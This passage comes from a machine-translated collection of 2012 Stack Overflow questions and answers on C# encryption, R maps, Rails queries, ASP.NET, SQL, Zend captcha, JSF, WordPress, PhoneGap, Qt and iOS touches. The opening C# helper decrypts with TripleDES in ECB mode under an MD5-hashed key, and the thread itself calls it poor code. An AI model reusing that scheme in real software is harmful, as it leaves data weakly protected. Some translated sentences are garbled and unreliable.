            return Encoding.UTF8.GetString(utf8.GetBytes(""));
        }
        else
        {
            try
            {
                byte[] keyArray;
                //get the byte code of the string

                byte[] toEncryptArray = Convert.FromBase64String(cipherString);

                if (useHashing)
                {
                    //if hashing was used get the hash code with regards to your key
                    MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
                    keyArray = md5CryptoServiceProvider.ComputeHash(UTF8Encoding.UTF8.GetBytes(key));
                    //release any resource held by the MD5CryptoServiceProvider

                    md5CryptoServiceProvider.Clear();
                }
                else
                {
                    //if hashing was not implemented get the byte code of the key
                    keyArray = UTF8Encoding.UTF8.GetBytes(key);
                }

                TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider();
                //set the secret key for the tripleDES algorithm
                tdes.Key = keyArray;
                //mode of operation. there are other 4 modes. 
                //We choose ECB(Electronic code Book)

                tdes.Mode = CipherMode.ECB;
                //padding mode(if any extra byte added)
                tdes.Padding = PaddingMode.PKCS7;

                ICryptoTransform cTransform = tdes.CreateDecryptor();
                byte[] resultArray = cTransform.TransformFinalBlock(
                                     toEncryptArray, 0, toEncryptArray.Length);
                //Release resources held by TripleDes Encryptor                
                tdes.Clear();
                //return the Clear decrypted TEXT
                return Encoding.UTF8.GetString(resultArray);
            }
            catch (Exception)
            {
                UTF8Encoding utf8 = new UTF8Encoding();
                return Encoding.UTF8.GetString(utf8.GetBytes(""));
            }
        }
        }
    }
} 
```

所以问题出在解密方法上。请问有什么线索吗？

PS 是的，我知道代码并不理想。这门课不是我写的，我只是想用它。感谢您提出改进建议，我一定会考虑它们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:32:04.220

如果您真的想允许空密码，请确保您使用特殊情况的 null 以及空字符串。

所以改变

```
if (toEncrypt == "") 
```

至

```
if (string.IsNullOrEmpty(toEncrypt)) 
```

如果`toEncrypt`为 null 或为空，则返回 null。

也改变

```
if (cipherString == "") 
```

至

```
if (string.IsNullOrWhiteSpace(cipherString)) 
```

如果 'cipherString' 为空或空格，则返回一个空字符串。

注意 - 上面 CodesInChaos 的评论是非常正确的。这段代码有一定的味道。他给出了很好的建议。

# r - 如何减少世界地图的空白边距

> ID：13343726
> 
> 赞同：6
> 
> 时间：2012-11-12T12:29:37.950
> 
> 标签：r, ggplot2, knitr, maptools

```
library(maptools)
data(wrld_simpl)
plot(wrld_simpl)
box() 
```

这给了我一张世界地图，并显示了地图顶部和底部的大量空白。我希望这个空间消失，因为我需要打印许多（~60）张地图。我正在使用`knitr`将嵌入地图的报告。例如

```
Here is some text.
<<chunk.maps, eval = TRUE>>=
library(maptools)
plot(wrld_simpl)
box()
@
And some more text. 
```

但我不认为这是一个`knitr`问题。所以：

1.  我怎样才能摆脱空白？
2.  如何确保地图从左到右填满我的页面？

我试过了，，，，但`mai`没有这样的运气！我猜测chunk 选项会给出我的问题 2 的结果，但由于我严重卡在问题 1 上，我发现很难说。`mar``par``out.width`

非常感谢！这里有很多东西要学！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:56:05.597

我`ggplot2`用于这些类型的地图：

```
require(ggplot2); theme_set(theme_bw())
wrld_simpl_df = fortify(wrld_simpl)
ggplot(wrld_simpl_df, aes(x = long, y = lat, group = group)) + 
   geom_path() + coord_equal() 
```

![在此处输入图像描述](../Images/123f51b4601b64b29a9d00e2f9b521c0.png)

这还包括您抱怨的空白。问题是 x 轴和 y 轴之间的纵横比是固定的。因此，如果您选择方形图形设备，则会在上方和下方留下白色边框。解决方案是使您的图形设备具有与您的绘图大致相同的比例。使用`fig.width`和 `fig.height`来执行此操作。有关更多信息，请参阅[此链接](http://yihui.name/knitr/options)。作为说明，当以正确的比例保存上面的图时：

```
ggsave("/tmp/plt.png", width = 16, height = 9) 
```

![在此处输入图像描述](../Images/33e682df30ab5292a7dbcf9c4a73da75.png)

问题不再存在。

# ruby-on-rails-3 - 使用 .where 测试属性是否不为零

> ID：13343728
> 
> 赞同：1
> 
> 时间：2012-11-12T12:29:49.983
> 
> 标签：ruby-on-rails-3, activerecord, where

我正在使用 devise_invitable。

我正在尝试查找所有用户`invitation_token != nil`

我以为`User.where(:invitation_token != nil)` 会这样做..但它会返回所有用户..

当我做

```
pry(main)> User.where(:invitation_token != nil)[0].invitation_token
  User Load (1.0ms)  SELECT "users".* FROM "users" WHERE ('t')
=> nil 
```

所以我不明白这里发生了什么.. 当测试为假时，如何使用 where 找到模型？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:49:47.377

你应该做：

```
User.where('invitation_token IS NOT NULL') 
```

您的解决方案不起作用，因为`:invitation_token != nil`将评估为`true`，所以您实际所做的是：

```
User.where(true) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-19T17:13:20.550

根据您的 rails 版本，这更漂亮：

```
User.where.not(invitation_token: nil) 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-12T12:39:32.440

也许你可以这样做：

```
User.where(:invitation_token => nil)
User.where("invitation_token IS NULL") 
```

它继续...

# qt - 如何在嵌入式 qt 中设置鼠标灵敏度/速度？

> ID：13343731
> 
> 赞同：2
> 
> 时间：2012-11-12T12:30:06.737
> 
> 标签：qt, mouse

我正在运行一个使用 QT 的嵌入式应用程序。有时鼠标速度太慢/太快。

我该如何调整它？

# jquery - jquery在尝试获取文本框（asp.net）的值时返回'UNDEFINED'

> ID：13343736
> 
> 赞同：4
> 
> 时间：2012-11-12T12:30:40.713
> 
> 标签：jquery, asp.net, jquery-ui

当我尝试使用 .val() 获取文本框的值时，它总是显示“未定义”。下面是我正在使用的代码。请朋友们帮帮我。

```
<asp:TextBox runat="server" ID="txtComment" Width="650" />

<asp:Button runat="server" ID="btnSubmitComment" Text="Submit" />

$(document).ready(function () {
    $('input[id$=btnSubmitComment]').click(function () {
    var comment = $("#txtComment").val();
    alert(comment);
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:33:21.533

asp.net 填充元素返回的`id`. 看起来您在 click 语句中使用它。你试过这个吗？

```
$(document).ready(function () {
    $('input[id$=btnSubmitComment]').click(function () {//you are using the [id$=] selector here.
    var comment = $("input[id$=txtComment]").val();//use it here too
    alert(comment);
}); 
```

或者你可以使用`<%= txtComment.ClientID %>`，但我个人从未使用过。我相信您需要告诉 asp.net 将 JavaScript 文件嵌入到页面中，以便将客户端`id`放置在适当的位置。我将寻找这个潜在解决方案的链接。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T12:34:53.070

这很正常，当 .net 呈现 HTML 时，texbox 的 ID 会变成类似 ct_001_txtComment 的东西。

*   您可以添加一个 css 类并从该类中获取值。
*   或者您可以更改 web.config 中的以下选项以使页面元素中的 ids 静态

    `controlRenderingCompatibilityVersion="4.0" clientIDMode="Static"`

*   或者您可以像这样从客户端 ID 获取它：<%=txtComment.ClientID%>

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:39:20.093

asp.net 上的一种标准方法是获取呈现的 id 并在 javascript 上将其用作：

```
$(document).ready(function () {
    $('#<%=btnSubmitComment.ClientID%>').click(function () {
    var comment = $('#<%=txtComment.ClientID%>').val();
    alert(comment);
}); 
```

（从您使用 ID 的那一刻起，而不是使用其他方式来选择控件，例如 css、类型等。

# sql - 如何创建可靠的组 SQL？

> ID：13343739
> 
> 赞同：0
> 
> 时间：2012-11-12T12:31:04.787
> 
> 标签：sql, sql-server, sql-server-2008, tsql

我想对 SQL 列进行分组。有用的用法是`group by`. 但它不起作用。我的目标数据如下。第二张照片是我想要的桌子。如何创建第二个结果？如何编写 SQL 代码？以下只是一个示例；不要专注于`id`,`Name`等`SurName`。重要的是`Value`和`Group`。

![在此处输入图像描述](../Images/b3e97e7395cdd070020bfdc0c3ccb3e9.png)

我想要的结果： ![在此处输入图像描述](../Images/61000aebba011a235641bb92b4ca3ad8.png)

在我不想要的结果下方：组是字符串。如果 al 列 X0digitdigitdigit 格式。一切都可以通过订购。但组 A0123、A0045、A0003 等 ![在此处输入图像描述](../Images/21c864bc509915c6d72bbe08877391c7.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:33:47.897

```
SELECT *
    FROM tbl
ORDER BY [group], value; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:02:01.493

我认为您误解了 GROUP BY。

GROUP BY 每组返回 1 个结果行。这意味着您不能在结果行中返回单个结果，只能返回组本身和在组上计算的聚合（例如 COUNT、SUM、MAX）。

ORDER BY 是你想要的。

# c# - SubSonic 在生成的类中生成编译器警告

> ID：13343741
> 
> 赞同：0
> 
> 时间：2012-11-12T12:31:13.380
> 
> 标签：c#, .net, visual-studio-2010, orm, subsonic

我的几个 ASP.NET MVC 2 (.NET 3.5) 项目使用 SubSonic 2 作为项目数据层中的主要数据库访问器。这工作得很好，数据库中的所有内容都可以毫无问题地访问。但是，最近，我的工作实施了“零警告”政策，因此我们一直在检查所有项目，以消除项目中的任何警告（如果可能）。

有问题的项目只剩下 SubSonic 警告来消除或抑制，但是，这些是在生成的类本身中找到的，这使得删除它们很成问题。我收到的警告如下：

*   “...覆盖 Object.Equals(object o) 但不覆盖 Object.GetHashCode() ...”在 ActiveRecord.cs
*   “... .Name' 隐藏继承的成员 'SubSonic.Schema.DatabaseTable.Name'。如果要隐藏，请使用 new 关键字。...”在 Struct.cs
*   “在模板中发现了多个模板指令。除第一个之外的所有模板指令都将被忽略。模板指令的多个参数应在一个模板指令中指定”在 Settings.ttinclude 中
*   SQLServer.ttinclude 中的“编译转换：分配了变量‘参数’，但从未使用过它的值”
*   “不再支持 C# 2.0 和 C# 3.5 编译器。模板将始终使用版本 4 编译器而不是指定的 'v3.5' 编译。” 在上下文中.tt

我已经尝试到处寻找这些警告的解决方案，但到目前为止还没有运气。有没有其他人遇到过这样的警告，如果有，你是如何解决的？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:48:50.237

你不会喜欢这个的。

可以一劳永逸地解决您的问题的唯一选择是下载 SubSonic 源，对[模板](https://github.com/subsonic/SubSonic-2.0/blob/master/SubSonic/CodeGeneration/Templates/CS_ClassTemplate.aspx)进行必要的更改，重新编译并使用您自己的二进制文件而不是库存下载。

从长远来看，我强烈建议完全放弃 SubSonic。这不值得痛苦。

# mysql - SQL 哪个是查询字符限制？

> ID：13343743
> 
> 赞同：2
> 
> 时间：2012-11-12T12:31:24.110
> 
> 标签：mysql, sql, character, limit

有谁可以告诉我查询是否有任何字符限制？

我想知道因为我需要建立一个大的例行查询，但不确定查询是否应该有字符限制。

我正在使用：MySQL 最新版本、Apache 2 和 PHP

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T13:45:02.357

这是我在这个主题上找到的几篇好文章。第二条其实是第一条中提到的。

MySQL查询的最大长度？ [http://bytes.com/topic/php/answers/8519-maximum-length-mysql-query](http://bytes.com/topic/php/answers/8519-maximum-length-mysql-query)

数据包太大 - MySQL [http://www.devshed.com/c/a/MySQL/Troubleshooting-Problems-with-MySQL-Programs/4/](http://www.devshed.com/c/a/MySQL/Troubleshooting-Problems-with-MySQL-Programs/4/)

# c# - 多边形重叠

> ID：13343748
> 
> 赞同：0
> 
> 时间：2012-11-12T12:32:16.713
> 
> 标签：c#, asp.net-mvc-4, polygon

在我们的项目中，我们使用的是 asp.net mvc 4.5，所以它对于 os all 来说是相当新的。我得到了一张不同多边形的地图。如果一个多边形与另一个多边形重叠，那么我必须调整第一个多边形，所以没有人重叠我可以使用 PolyArea 对象上的一个名为 Difference 的方法来实现这一点，然后使第一个等于差异，但在示例 3 中，差异是有效的，所以我的问题是我如何在示例 3 中将第一个多边形调整到最后一个多边形。我认为必须将多边形分解为两个多边形，但我该如何实现这一点。

![多边形示例](../Images/476ab5ec4b8f6388cfb3d08997e299c6.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:51:23.590

应用剪辑差异应该删除重叠区域，但我不知道为什么这在你的第三种情况下不起作用。我认为这是您使用的理发器的缺陷。您应该使用不同的裁剪器（例如[Clipper](http://sourceforge.net/projects/polyclipping/)）获得更大的成功。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T10:28:45.460

我发现了为什么当我在 DbGeometry 对象上运行差异方法时它不起作用，所以我尝试将 dbgeometry 对象转换为 dbGeography 然后它起作用了。也许有一天它可以帮助其他人。

# captcha - zend 框架 2 验证码助手视图内联渲染

> ID：13343751
> 
> 赞同：0
> 
> 时间：2012-11-12T12:32:26.383
> 
> 标签：captcha, zend-framework2, view-helpers

我正在尝试使用 formCaptcha Helper 查看验证码元素，如下所示：

```
 $this->formElementErrors()
        ->setMessageOpenFormat('<br><span class="error-message">')
        ->setMessageCloseString('</span>');
    echo $this->form()->openTag($form); 
    echo $this->formRow($form->get('mail')) . "<br>";
    echo $this->formRow($form->get('password')) . "<br>";
    echo $this->formRow($form->get('name')) . "<br>";
    echo $this->formCaptcha($form->get('captcha')) . "<br>";
    echo $this->formRow($form->get('register-button')); 
    echo $this->formRow($form->get('register-type'));
    echo $this->form()->closeTag(); 
```

但是验证码使用内联模式渲染所有 HTML 标签如何显示图像：

![在此处输入图像描述](../Images/a63d8125ad84e09935d3d66e87f5c0eb.png)

我如何将图像视为一个块（即：图像下方的文本字段）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T23:32:15.520

我知道你的问题没有简短的答案。我有类似的需求并构建了一个解决方案，并提供了一篇博文和 github 代码。[http://zendtemple.blogspot.com/2012/12/zend-framework-2-zf2-creating-view.html][1]

我创建了自己的视图助手并将其注册到 PhpRenderer 中的可调用对象中。

然后，我创建了一个新的自定义验证码图像类，它扩展了原始的 zend 验证码图像类并覆盖了“getHelperName”函数以指向新的助手。

默认的 Zend\Form\View\Helper\Captcha\Image.php 渲染函数采用了验证码图像、输入框和 id 的模式。它看起来像这样：

```
$pattern = '%s%s%s';
if ($position == self::CAPTCHA_PREPEND) {
    return sprintf($pattern, $captchaInput, $separator, $img);
}
return sprintf($pattern, $img, $separator, $captchaInput); 
```

在您的自定义视图助手中，您可以创建任何您想要的模式。

这是我的自定义视图助手。我重写了模式并将元素包装在单独的 div 中： //module\Application\src\Application\View\Helper\Form\Custom\Captcha\ViewHelperCaptcha.php

```
namespace  Application\View\Helper\Form\Custom\Captcha;
use Zend\Form\View\Helper\Captcha\AbstractWord;
//our custom captcha image extending the orginal
use Application\View\Helper\Form\Custom\Captcha\CustomCaptcha as CaptchaAdapter;
use Zend\Form\ElementInterface;
use Zend\Form\Exception;

class ViewHelperCaptcha extends AbstractWord
{
 /**
 * Override
  * 
  * Render the captcha
  *
  * @param  ElementInterface $element
  * @throws Exception\DomainException
  * @return string
  */
 public function render(ElementInterface $element)
 {
 //we could also set the separator here to break between the inputs and the image.
 //$this->setSeparator('
')
  $captcha = $element->getCaptcha();

if ($captcha === null || !$captcha instanceof CaptchaAdapter) {
   throw new Exception\DomainException(sprintf(
     '%s requires that the element has a "captcha" attribute of type     Zend\Captcha\Image; none found',
     __METHOD__
   ));
  }

  $captcha->generate();

  $imgAttributes = array(
    'width'  => $captcha->getWidth(),
    'height' => $captcha->getHeight(),
    'alt'    => $captcha->getImgAlt(),
    'src'    => $captcha->getImgUrl() . $captcha->getId() . $captcha->getSuffix(),
  );
  $closingBracket = $this->getInlineClosingBracket();
  $img = sprintf(
    '<img %s%s',
    $this->createAttributesString($imgAttributes),
    $closingBracket
  );

  $position     = $this->getCaptchaPosition();
  $separator    = $this->getSeparator();
  $captchaInput = $this->renderCaptchaInputs($element);

  $pattern = '<div class="captcha_image">%s</div>%s<div class="captcha_input">%s</div>'
  if ($position == self::CAPTCHA_PREPEND) {
   return sprintf($pattern, $captchaInput, $separator, $img);
  }

  return sprintf($pattern, $img, $separator, $captchaInput);
 }

} 
```

现在我需要在 invokables 中注册这个助手：

```
\modules\Application\config\module.config.php
'view_helpers' => array(
    'invokables' => array(
    'viewhelpercaptcha' =>'Application\View\Helper\Form\Custom\Captcha\ViewHelperCaptcha',
    ),
), 
```

这是我的 CustomCaptcha 扩展了原始的和 orverriding 的“getHelperName”以指向我新注册的视图助手“viewhelpercaptcha”：\module\Application\src\Application\View\Helper\Form\Custom\Captcha\CustomCaptcha.php

```
namespace  Application\View\Helper\Form\Custom\Captcha;

//The orginial that we are intending to extend from
use Zend\Captcha\Image as CaptchaImage;
//The new extend verision were we override only what we need.
class CustomCaptcha extends CaptchaImage
{

 /**
  * !!! Override this function to point to the new helper.
  * Get helper name used to render captcha
  *
  * @return string
  */
 public function getHelperName()
 {
     return 'viewhelpercaptcha';
 }
} 
```

剩下要做的就是在表单中使用它。

```
//Create our custom captcha class
$captchaImage = new CustomCaptcha(  array(
   'font' => $dirdata . '/fonts/arial.ttf',
   'width' => 200,
   'height' => 100,
   'wordLen' => 5,
   'dotNoiseLevel' => 50,
   'lineNoiseLevel' => 3)
 );
 $captchaImage->setImgDir($dirdata.'/captcha');
 $captchaImage->setImgUrl($urlcaptcha);
//Create a form element captcha adding our custom captcha
// created above.
$this->add(array(
'type' => 'Zend\Form\Element\Captcha',
'name' => 'captcha',
'options' => array(
'label' => 'Please verify you are human',
'captcha' => $captchaImage,
), 
```

));

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-31T19:48:00.513

要直接在视图中渲染*Zend\Captcha\Image ，您可以使用这个简单的代码。*

```
<?php
  $captchaName = 'captcha'; // This is the name as given in form declaration

  $captcha = $form->get($captchaName)->getCaptcha();
  $captcha->generate();
?>
<div>
  <?= $this->formLabel($form->get($captchaName)) ?>
  <img width="<?= $captcha->getWidth() ?>" height="<?= $captcha->getHeight() ?>" src="<?= $captcha->getImgUrl() . $captcha->getId() . $captcha->getSuffix(); ?>" alt="<?= $captcha->getImgAlt() ?>">
  <input type="text" name="<?= $captchaName ?>[input]">
  <input type="hidden" value="<?= $captcha->getId() ?>" name="<?= $captchaName ?>[id]">
</div> 
```

# jsf - 未指定默认命名空间时，函数 [functionName] 必须使用前缀

> ID：13343756
> 
> 赞同：1
> 
> 时间：2012-11-12T12:32:43.530
> 
> 标签：jsf, el, crud, jsf-1.2

我正在使用 JSF 1.2，我正在尝试删除和/或更新其中的一行，`<h:dataTable>`其中当前行作为操作方法的参数传递。

看法：

```
<h:dataTable value="#{myBean.list}" var="categoria">
  ...
  <h:column>
    <h:commandButton value="Update" action="#{myBean.updateCat(categoria)}" />
    <h:commandLink value="Delete" action="#{myBean.deleteCat(categoria.cod)}" />
  </h:column>
</h:dataTable> 
```

控制器：

```
public void deleteCat(int cod) {
  this.controller.deleteCat(cod);
}

public void updateCat(Categoria cat) {
  this.controller.updateCat(cat);
} 
```

但我收到以下错误：

> 当未指定默认命名空间时，函数 deleteCat 必须与前缀一起使用

这是如何引起的，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T13:37:40.880

> 当未指定默认命名空间时，函数 deleteCat 必须与前缀一起使用

当当前 EL 环境不支持使用参数调用 bean 方法的新 EL 2.2 功能时，此错误消息很典型。当当前的 EL 环境实际上根本不符合 EL 2.2 版时，就会发生这种情况。EL 2.2 是 Servlet 3.0 的一部分，因此需要与 Servlet 3.0 兼容的容器（Tomcat 7、Glassfish 3、JBoss 6 等）与 Servlet 3.0 兼容`web.xml`才能工作。

在 EL 2.2 之前，EL 表达式中的括号`()`默认被解释为 EL 函数参数。然而，EL 函数又应该被 taglib 命名空间上的冒号前缀引用，`#{fn:length(bean.list)}`而不是句点。这至少解释了乍一看相当奇怪的错误消息。

鉴于您使用的是旧版 JSF 1.2，您很可能使用的是 Servlet 2.5（Tomcat 6、Glassfish 2、JBoss 4 等），因此也隐含使用 EL 2.1。为了模拟使用参数调用 bean 方法的新 EL 2.2 功能，最好的办法是下载并安装 JBoss EL，如以下答案所述：[Invoking methods with parameters by EL in JSF 1.2](https://stackoverflow.com/questions/8325298/invoking-methods-with-parameters-by-el-in-jsf-1-2/8326551#8326551)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T13:25:14.570

我设法通过将数据表与 HtmlDataTable 绑定来解决问题。

在这里找到解决方案：http: [//www.coderanch.com/t/497447/JSF/java/delete-row-datatable](http://www.coderanch.com/t/497447/JSF/java/delete-row-datatable)

```
<h:dataTable id="table" value="#{myBean.list}"
binding="#{myBean.dataTable}"
var="categoria" border="1" styleClass="tabelaFormulario"
headerClass="tabelaTituloFormulario"
rowClasses="tabelaLinhaPar, tabelaLinhaImpar"> 
```

之后在 bean 中：

```
private HtmlDataTable dataTable; // + getter & setter 
```

最后我可以通过使用从选定行中获取数据

```
dataTable.getRowData(); 
```

现在的功能是：

```
public void deleteCat() {
    this.controller.deleteCat(this.list.get(this.dataTable.getRowIndex()).getCod());
} 
```

无论如何，谢谢，希望它可以帮助别人......

# dynamics-crm-2011 - CRM 2011 - 自定义实体错误

> ID：13343759
> 
> 赞同：-2
> 
> 时间：2012-11-12T12:32:50.647
> 
> 标签：dynamics-crm-2011

我创建了一个自定义实体，并将 javascript 从 CRM 4 更新到 2011。

但是，当表单加载时，我收到此错误：

> 此字段自定义事件出错。
> 
> 字段：窗口
> 
> 事件：加载
> 
> 错误：无法获取属性“1”的值：对象为空或未定义。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T16:03:34.237

使用 F12 打开开发者工具并追踪错误。您在表单上有某种类型的 javascript 错误...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T16:08:19.143

在您的 java 脚本中使用 Debugger 语句并对其进行调试。

# sql-server - 使用多个 SELECT 语句进行查询

> ID：13343760
> 
> 赞同：0
> 
> 时间：2012-11-12T12:32:53.903
> 
> 标签：sql-server, tsql

是否可以进行包含 4 个 SELECT 语句的查询，其中每个结果都放在自己的列中？如何？

我目前正在处理 4 个查询，我需要以某种方式将它们组合成 1 个，并且我尝试使用 UNION 但它似乎将结果放在同一列中，只是一个新行。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:36:07.970

如果 SELECT 语句每个都返回一个 SCALAR 结果，即单行单列 - 那么你可以这样做：

```
SELECT (select .... ) Column1,
       (select .... ) Column2,
       (select .... ) Column3,
       (select .... ) Column4; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:36:31.247

您可以使用子查询和列别名：

```
SELECT (SELECT TOP 1 Col1 From dbo.Table2 WHERE Condition1)AS Col1
,      (SELECT TOP 1 Col1 From dbo.Table3 WHERE Condition2)AS Col2
FROM dbo.Table1 
```

[在 T-SQL 语句中使用子查询](http://www.databasejournal.com/features/mssql/article.php/3464481/Using-a-Subquery-in-a-T-SQL-Statement.htm)

# php - 在 WordPress 插件中使用多个文件 - 调用未定义函数 add_action()

> ID：13343761
> 
> 赞同：6
> 
> 时间：2012-11-12T12:33:07.743
> 
> 标签：php, wordpress

我正在尝试编写一个包含多个文件的插件。我确定我以前没有问题，但现在我在这个问题上遇到了问题。

在主插件文件中，我包含了一个文件名 - *ydp-includes.php*。在*ydp-includes.php*中，我包含了我想要的所有文件，如下所示：

```
<?php
    include(dirname(__FILE__) . '/1.php');
    include(dirname(__FILE__) . '/2.php');
    include(dirname(__FILE__) . '/3.php');
    include(dirname(__FILE__) . '/4.php');
?> 
```

但我得到：

> 致命错误：调用未定义的函数 add_action()

这些文件已包含在内，但出于某种原因，我目前看不到 WordPress 并没有将它们视为一个插件包，并且内部的每个 WordPress 功能都被忽略了。

是否有另一种最佳实践方式来开发多个文件 WordPress 插件？我究竟做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T13:57:07.600

在 PHP`include`中是一个[语句，而不是一个函数](http://php.net/manual/en/function.include.php)。

所以应该是：

```
<?php
include dirname( __FILE__ ) .'/1.php';
include dirname( __FILE__ ) .'/2.php';
include dirname( __FILE__ ) .'/3.php';
include dirname( __FILE__ ) .'/4.php';
?> 
```

或者是完美的：

```
<?php
require_once dirname( __FILE__ ) .'/1.php';
require_once dirname( __FILE__ ) .'/2.php';
require_once dirname( __FILE__ ) .'/3.php';
require_once dirname( __FILE__ ) .'/4.php';
?> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-04-10T23:52:28.027

根据错误消息，听起来您正在尝试直接访问插件文件，这是不正确的。WordPress 使用前端控制器设计模式，这意味着您将希望拥有这样的文件：

```
my-plugin-folder/my-plugin-name.php
my-plugin-folder/includes/ydp-includes.php
my-plugin-folder/includes/ydp-database.php 
```

在 my-plugin-name.php 内部：

```
//Get the absolute path of the directory that contains the file, with trailing slash.
define('MY_PLUGIN_PATH', plugin_dir_path(__FILE__)); 
//This is important, otherwise we'll get the path of a subdirectory
require_once MY_PLUGIN_PATH . 'includes/ydb-includes.php';
require_once MY_PLUGIN_PATH . 'includes/ydb-database.php';
//Now it's time time hook into the WordPress API ;-)
add_action('admin_menu', function () {
  add_management_page('My plugin Title', 'Menu Title', 'edit_others_posts', 'my_menu_slug', 'my_plugin_menu_page_content'
});
//Php 5.3+ Required for anonymous functions. If using 5.2, create a named function or class method

function my_plugin_menu_page_content () {
    //Page content here
} 
```

这将添加一个 WordPress 管理菜单项，并加载所需的文件。您现在还可以使用常量在包含的文件中要求更多文件`MY_PLUGIN_PATH`

**也可以看看：**

[add_menu_page](http://codex.wordpress.org/Function_Reference/add_menu_page) [plugin_dir_path](https://codex.wordpress.org/Function_Reference/plugin_dir_path%20Get%20Plugin%20Path) ()

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-04-07T03:53:42.683

用于`plugin_dir_path( __FILE__ );`获取插件的文件。使用下面的代码参考：

```
$dir = plugin_dir_path( __FILE__ );

require_once($dir.'1.php');

require_once($dir.'2.php');

require_once($dir.'3.php');

require_once($dir.'4.php'); 
```

# javascript - 如何使用 Javascript 检测基于 Phonegap 的 Android 应用何时失去焦点

> ID：13343763
> 
> 赞同：10
> 
> 时间：2012-11-12T12:33:13.437
> 
> 标签：javascript, android, cordova

我的标题总结了我的问题。我有一个完全用 html5 和 javascript 编写的 Android 应用程序。我是java的初学者（充其量）并且不想使用java来做到这一点，而是使用javascript。我希望能够在来电或应用程序进入后台时关闭视频和音乐。我已经尝试过 window.onBlur 和新的 html5 可见性 API。没有骰子。有没有办法在不卷起袖子学习 Java 的情况下做到这一点？我想使用javascript。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T16:19:55.293

注册“暂停”事件。当您的应用程序暂停时，通常意味着您已被置于后台。当您暂停时停止播放音频。

[http://docs.phonegap.com/en/2.2.0/cordova_events_events.md.html#pause](http://docs.phonegap.com/en/2.2.0/cordova_events_events.md.html#pause)

然后注册一个恢复事件并重新启动：

[http://docs.phonegap.com/en/2.2.0/cordova_events_events.md.html#resume](http://docs.phonegap.com/en/2.2.0/cordova_events_events.md.html#resume)

# c++ - 如何在 QLocalSocket::write 中写入所有数据而不阻塞？

> ID：13343765
> 
> 赞同：3
> 
> 时间：2012-11-12T12:33:16.637
> 
> 标签：c++, qt4

我正在使用从 QIODevice 派生的 QLocalSocket。文档`QIODevice::write`说

> 最多将数据中的 maxSize 字节数据写入设备。返回实际写入的字节数，如果发生错误，则返回 -1。

我很困惑在什么情况下该函数写入的数据少于`maxSize`字节，而文档似乎没有告诉我这一点。我可以这样循环

```
for(int written = 0; written != len;) {
  int writtenNow = sock->write(data + written, len - written);
  if(writtenNow != -1) {
    written += writtenNow;
  } else {
    // oops, call cops!
  }
} 
```

但是当它没有写入所有数据时该怎么办？我应该打电话`waitForBytesWritten`吗？根据 的文档`QLocalSocket`，这不应该是必要的

> 尽管 QLocalSocket 是为与事件循环一起使用而设计的，但也可以在没有事件循环的情况下使用它。在这种情况下，您必须使用 waitForConnected()、waitForReadyRead()、waitForBytesWritten() 和 waitForDisconnected()，它们会阻塞直到操作完成或超时到期。

因此，我很困惑。任何人都可以对此有所了解吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T15:40:47.647

我解决了这样的问题，它在单独的线程中运行 write 方法，并且主线程不会阻塞

```
...
QtConcurrent::run(this, &MyClass::writeAsync, sock, data);
...

void MyClass::writeAsync(QLocalSocket socket, QByteArray data) {
    socket->write(data);
} 
```

# objective-c - 无需从屏幕上移开手指即可触摸按钮

> ID：13343766
> 
> 赞同：0
> 
> 时间：2012-11-12T12:33:20.250
> 
> 标签：objective-c, ios

有没有一种方法可以检测 UIButton 内部的触摸，而无需用户从屏幕上移开手指？

示例：如果您有两个按钮，并且用户点击了左侧的一个，然后将手指拖到右侧，应用程序必须识别出您正在点击右侧的按钮。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:57:05.143

您应该能够使用已经存在的按钮事件来执行此操作。例如“Touch Drag Outside”、“Touch Up Outside”、“Touch Drag Exit”等。

只需注册这些活动，看看哪些活动适合您的需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:43:14.470

我会使用 UIViewController 自己实现。

而不是使用按钮。

在屏幕上放置两个视图（每个按钮一个）您可以制作这些按钮、imageViews 或只是 UIViews，但要确保它们具有`userInteractionEnabled = NO;`.

然后在 UIViewController 中使用方法`touchesBegan`和`touchesMoved`.

我会在 viewController 中保存一些状态，比如......

```
BOOL trackTouch;
UIView *currentView; 
```

然后，如果 touchesBegan 在您的某个视图中...

```
-(void)touchesBegan... (can't remember the full name)
{
    UITouch *touch = [touches anyObject];
    CGPoint point = [touch locationInView:self.view];
    if (CGRectContainsPoint(firstView, point)) {
        trackTouch = YES
        //deal with the initial touch...
        currentView = firstView;  (work out which view you are in and store it)
    } else if (CGRectContainsPoint(secondView, point)) {
        trackTouch = YES
